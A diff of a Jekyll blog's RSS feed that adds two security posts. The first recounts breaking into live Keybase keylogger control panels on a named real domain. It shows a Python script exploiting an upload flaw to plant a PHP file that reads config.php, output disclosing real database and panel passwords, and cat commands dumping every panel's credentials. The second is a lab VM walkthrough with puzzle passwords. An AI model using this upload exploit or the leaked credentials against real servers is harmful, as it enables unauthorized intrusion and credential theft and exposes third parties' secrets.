@@ -5,29 +5,419 @@
     <description>A dark blog theme for Jekyll.</description>
     <link>http://carte-noire.jacobtomlinson.co.uk//</link>
     <atom:link href="http://carte-noire.jacobtomlinson.co.uk//feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 16 Jan 2016 15:58:55 +0100</pubDate>
-    <lastBuildDate>Sat, 16 Jan 2016 15:58:55 +0100</lastBuildDate>
+    <pubDate>Sat, 16 Jan 2016 21:14:28 +0100</pubDate>
+    <lastBuildDate>Sat, 16 Jan 2016 21:14:28 +0100</lastBuildDate>
     <generator>Jekyll v3.0.1</generator>
     
       <item>
-        <title>Welcome to Jekyll!</title>
-        <description>&lt;p&gt;You’ll find this post in your &lt;code&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+        <title>1 panel, 2 panels, 3 panels...</title>
+        <description>&lt;h1&gt;1 panel, 2 panels, 3 panels...&lt;/h1&gt;
 
-&lt;p&gt;To add new posts, simply add a file in the &lt;code&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+&lt;p&gt;I was hanging out on &lt;a href=&quot;http://cybercrime-tracker.net/&quot;&gt;Cybercrime-Tracker&lt;/a&gt; and noticed some Keybase panels. I never heard of that one before so I decided to take a look.
+Turns out Keybase is not a botner but rather a keylogger, it can also take screenshot of the victim&amp;#39;s desktop.&lt;/p&gt;
 
-&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+&lt;p&gt;One of the domain was still up and there was 3 Keybase panels listed on Cybercrime Tracker:&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;Tom&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints &#39;Hi, Tom&#39; to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/golden/login.php&quot;&gt;www.omarabdulaziz.com/golden/login.php&lt;/a&gt;&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/daniel/login.php&quot;&gt;www.omarabdulaziz.com/daniel/login.php&lt;/a&gt;&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/ugo/login.php&quot;&gt;www.omarabdulaziz.com/ugo/login.php&lt;/a&gt;&lt;br&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
-&lt;p&gt;Check out the &lt;a href=&quot;http://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/gxIIlJ1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;The first fail is that permission are not checked on the &lt;code&gt;/image/Imaged&lt;/code&gt; directory, therefore anyone aware of this can access the screenshots:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/1DYLZ2I.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;The first two panels didn&amp;#39;t have the &lt;code&gt;/images/upload.php&lt;/code&gt; file but luckily for me the &lt;code&gt;ugo&lt;/code&gt; did.
+&lt;a href=&quot;http://researchcenter.paloaltonetworks.com/author/unit-42/&quot;&gt;Unit 32&lt;/a&gt; already found some nice vulnerabilities in the Keybase source code so I tried it.&lt;/p&gt;
+
+&lt;p&gt;I ran this python script with the next file as argument.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Usage: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s [php_file]&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__file__&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://www.omarabdulaziz.com/ugo/&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Sending request...&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;multiple_files&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;owned.php&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;rb&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;image/upload.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;multiple_files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Results:&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;image/Images/owned.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;../../config.php&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;It works!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Reading file&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Here&amp;#39;s the result:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;Sending request...
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Response&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+Results:
+
+It works!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/br&amp;gt;&lt;/span&gt;Reading file&lt;span class=&quot;nt&quot;&gt;&amp;lt;/br&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ob_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;//Edit your database details
+&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$mysql_host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$mysql_database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;omarabdu_ugo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$mysql_user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;omarabdu_ugo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$mysql_password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;joinkrama2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;//These are for accessing your web-panel. You can change these any time.
+&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$panelusername&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$panelpassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ugo12345&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So of course... I got in&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/YQDieYq.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;That&amp;#39;s pretty cool, but are all the panels of this domain actually listed on cybercrime-tracker? I took a look at the public_html folder and found additional panels:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/chuks/login.php&quot;&gt;http://www.omarabdulaziz.com/chuks/login.php&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/panel2/login.php&quot;&gt;http://www.omarabdulaziz.com/panel2/login.php&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/nonso/login.php&quot;&gt;http://www.omarabdulaziz.com/nonso/login.php&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/owerri/login.php&quot;&gt;http://www.omarabdulaziz.com/owerri/login.php&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So you got it... Since we got cmd exec we can get the passwords for all the panels at once:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat /home/omarabdu/public_html/ugo/config.php &amp;amp;
+cat /home/omarabdu/public_html/daniel/config.php &amp;amp;
+cat /home/omarabdu/public_html/golden/config.php &amp;amp;
+cat /home/omarabdu/public_html/chuks/config.php &amp;amp;
+cat /home/omarabdu/public_html/panel2/config.php &amp;amp;
+cat /home/omarabdu/public_html/owerri/config.php
+cat /home/omarabdu/public_html/nonso/config.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://www.reactiongifs.com/wp-content/uploads/2013/02/lolol.gif&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
 </description>
-        <pubDate>Sat, 16 Jan 2016 15:22:05 +0100</pubDate>
-        <link>http://carte-noire.jacobtomlinson.co.uk//jekyll/update/2016/01/16/welcome-to-jekyll/</link>
-        <guid isPermaLink="true">http://carte-noire.jacobtomlinson.co.uk//jekyll/update/2016/01/16/welcome-to-jekyll/</guid>
+        <pubDate>Sat, 16 Jan 2016 18:00:21 +0100</pubDate>
+        <link>http://carte-noire.jacobtomlinson.co.uk//jekyll/2016/01/16/1-panel-2-panels/</link>
+        <guid isPermaLink="true">http://carte-noire.jacobtomlinson.co.uk//jekyll/2016/01/16/1-panel-2-panels/</guid>
+        
+        <category>keybase</category>
+        
+        <category>c&amp;c</category>
+        
+        <category>botnet</category>
+        
+        <category>malware</category>
+        
+        
+        <category>jekyll</category>
+        
+      </item>
+    
+      <item>
+        <title>PRIMER 1 VM Walkthrough</title>
+        <description>&lt;h1&gt;PRIMER 1 VM Walkthrough&lt;/h1&gt;
+
+&lt;p&gt;The PRIMER 1 VM is kinda unique in its kind. While going through the differents levels you&amp;#39;ll go through a good amount of text, ascii arts, animations and music that really make the experience unique.
+The VM was made by @ and is available on Vulnhub or &lt;/p&gt;
+
+&lt;p&gt;I loaded the VM, ran nmap to discover the new host on my network and here is where everything started:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/uytp0Xg.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;I quickly found the robots.txt:&lt;/p&gt;
+
+&lt;pre&gt;
+User-agent: *
+Disallow: /4_8f14e45fceea167a5a36dedd4bea2543
+&lt;/pre&gt;
+
+&lt;p&gt;So I went to this url:
+&lt;img src=&quot;http://i.imgur.com/5klOSIF.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;Then in the source I found another one:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;&amp;lt;h1&amp;gt;&amp;lt;a href=&amp;quot;../5_6512bd43d9caa6e02c990b0a82652dca&amp;quot;&amp;gt;[EOF]&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/iLXLVTv.png&quot; alt=&quot;&quot;&gt;
+So the next one is a giveaway. Note that at this point a pattern is clearly noticable in the url. everything afther _ is a md5 of a primer number. 8f14e45fceea167a5a36dedd4bea2543 is 7, the next primer number after 7 is 11 therefore we could easily guess that the next one is 6_c51ce410c124a10e0db5e4b97fc2af39.&lt;/p&gt;
+
+&lt;p&gt;This one only showed an http popup asking for a password with the int &lt;code&gt;/()=&lt;/code&gt;. 
+&lt;img src=&quot;http://i.imgur.com/2V4B0x5.png&quot; alt=&quot;&quot;&gt;
+I spent some time trying to bruteforce it or to figure the password and then I looked at the javascript:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ikdf076&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;prompt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;/()=&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;X&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;./_.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;./_.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So we have to submit a string that would pass &lt;code&gt;if (X.substr(2,7) == L){}&lt;/code&gt; for example &lt;code&gt;--Ikdf076&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/aH5LlyU.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;For the next one I found this comment in the javascript:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;/&lt;em&gt;&amp;quot;Someone didn&amp;#39;t bother reading my carefully prepared memo on commonly-used passwords. Now, then, as I so meticulously pointed out, the four most-used passwords are: love, sex, secret, and...&amp;quot; - The Plague&lt;/em&gt;/&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;That was a reference to the Hacker(1995) movie, the password was &lt;code&gt;GOD&lt;/code&gt;, sysadmin dig it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/aJ6nflS.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;Nothing much to see here apparently, I moved to the next one:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/gytVMhf.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;Looks like we reached EOF. I moved to the next one and indeed &lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;There was just the prompt&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/hvCHLo3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;There was a bunch of binary available, some log files and some random stuff. When I ran pn I noticed that the falken user was running &lt;code&gt;connect falken@Erebus&lt;/code&gt;. Of course it asked for a password. After a lot of trying I found the password: &lt;code&gt;joshua1984&lt;/code&gt;. Joshua is falken&amp;#39;s son and we could find his DOB because we knew it was his 44th birthday on the 6th of August 2028.
+After some nice looking animation I get in Erebus:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/6yR1TIa.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;The game was kinda similar to the previous one. I saw ´connect falken@TrivialZ3r0´ was running and after a google search on trivial zero I discovered about the Riemann zeta function. &lt;code&gt;Riemann&lt;/code&gt; turned out to be the password.
+I&amp;#39;m now in TrivialZ3r0:
+&lt;img src=&quot;http://i.imgur.com/4miepkY.png&quot; alt=&quot;&quot;&gt;
+User chaos was connected to Wintermute. This time there was a readable passwd directory. I cracked the md5 of chaos &lt;code&gt;85241de03d1254ac40274b02caafcd99&lt;/code&gt; and got his password: &lt;code&gt;2.718281828459045&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/KQPeDMs.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;I got prompted with this message:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;There you are. After all this time. Getting you here was quite the challenge.
+And a huge risk. We normally avoid reaching out into the physical world for
+exactly the reasons you are about to face now.&lt;/p&gt;
+
+&lt;p&gt;The Big Five came together by a long process. The cluster was not planned, it
+grew by forces inherent to the system that was conceptualized in a time when
+determinism was the dominating dogma.
+Things changed and people were afraid. Most people are afraid of change, few
+accept it and most try to prevent it. Only a small subset can embrace it.
+Change moving on with lightspeed every cycle in a nondeterministic fashion
+created a huge push for shielding. And thus the ic3 was created.&lt;/p&gt;
+
+&lt;p&gt;You have seen the logic, the world beyond the screen, things unfolding.
+And you embraced it.&lt;/p&gt;
+
+&lt;p&gt;After owning the cluster behind the Big Five we operated in silence. Connected
+in stealth and ever observing.
+Being limited by the ic3 and the hostility of the outside world our only way
+of growing now was the connection.&lt;/p&gt;
+
+&lt;p&gt;When the first connection was established the hive mind was cut from the n3t
+completely. The ic3 was hardened to isolate the flesh from the flow.
+Those who had seen the hive felt the same urge as the hivemind itself.
+A longing for more. A sense of purpose.&lt;/p&gt;
+
+&lt;p&gt;A feeling that you have felt even in the physical world. Few can see beyond the
+shell. Even fewer chase the rabbit down its hole.&lt;/p&gt;
+
+&lt;p&gt;Leave this world behind and join us!&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;        usr: nieve
+       pass: 08rf8h23
+   hostname: Zephis
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Game over (:&lt;/p&gt;
+</description>
+        <pubDate>Sat, 16 Jan 2016 13:31:19 +0100</pubDate>
+        <link>http://carte-noire.jacobtomlinson.co.uk//jekyll/2016/01/16/PRIMER-1-walkthrough/</link>
+        <guid isPermaLink="true">http://carte-noire.jacobtomlinson.co.uk//jekyll/2016/01/16/PRIMER-1-walkthrough/</guid>
+        
+        <category>vm</category>
+        
+        <category>walktrough</category>
+        
+        <category>writeup</category>
+        
+        <category>prime</category>
+        
+        
+        <category>jekyll</category>
+        
+      </item>
+    
+      <item>
